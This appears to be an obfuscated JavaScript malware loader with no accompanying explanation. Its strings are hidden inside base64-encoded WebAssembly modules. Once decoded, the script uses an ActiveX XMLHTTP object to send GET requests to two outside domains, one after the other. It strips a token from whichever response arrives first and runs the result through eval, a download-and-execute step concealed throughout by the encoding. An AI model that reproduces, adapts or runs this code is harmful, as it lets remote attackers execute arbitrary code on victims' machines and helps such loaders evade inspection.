const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGu4CAgAAKfwBBAQt/AEESC38AQeIAC38AQfoAC38AQaABC38AQaQBC38AQaoBC38AQboBC38AQcwBC38AQdwBCwfagICAAAsGbWVtb3J5AgAFZGF0YTADAAVkYXRhMQMBBWRhdGEyAwIFZGF0YTMDAwVkYXRhNAMEBWRhdGE1AwUFZGF0YTYDBgVkYXRhNwMHBWRhdGE4AwgFZGF0YTkDCQuLgoCAAAoAQQELD01zeG1sMi5YTUxIVFRQAABBEgtOelhNZDdXbXNmQ1lSNEVsaWpvd2ZuZG05QldfdlIwM2gtUEZ6MXpCcmZkUzdoSHA0dkVOcHRtNzBIUDE3a0JoVkVabE9uLWlYY3ZnXzAAAEHiAAsXc2luZ291dGxvdWRrYXJhb2tlLmNvbQAAQfoACyRjb3Jwb3JhdGlvbnJlZ2lzdHJ5LW9ubGluZS1mb3JtLmNvbQAAQaABCwJhAABBpAELBEdFVAAAQaoBCw5odHRwJTNBJTJGJTJGAABBugELESUyRmNvdW50ZXIlMkYlM0YAAEHMAQsOQWN0aXZlWE9iamVjdAAAQdwBCwVldmFsAA=='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var z1 = lS(0, 0);
var m = lS(0, 1);
var x = new Array(lS(0, 2), lS(0, 3));
var z4 = lS(0, 4);
for (var i = 0; i < x.length; i++) {
    var e = new window[(lS(0, 8, true))](z1);
    try {
        (() => {
            const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        e.open(lS(0, 5), lS(0, 6) + x[i] + lS(0, 7) + m, false);
                    }
                }
            });
            const __exports = __callInstance1.exports;
            return __exports.data();
        })();
        (() => {
            const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        e.send();
                    }
                }
            });
            const __exports = __callInstance0.exports;
            return __exports.data();
        })();
        if (e.status == 200) {
            var z3 = e.responseText;
            var z3 = z3.split(m);
            var z3 = z3.join(z4);
            window[lS(0, 9, true)](z3);
            break;
        }
        ;
    } catch (e) {
    }
    ;
}
;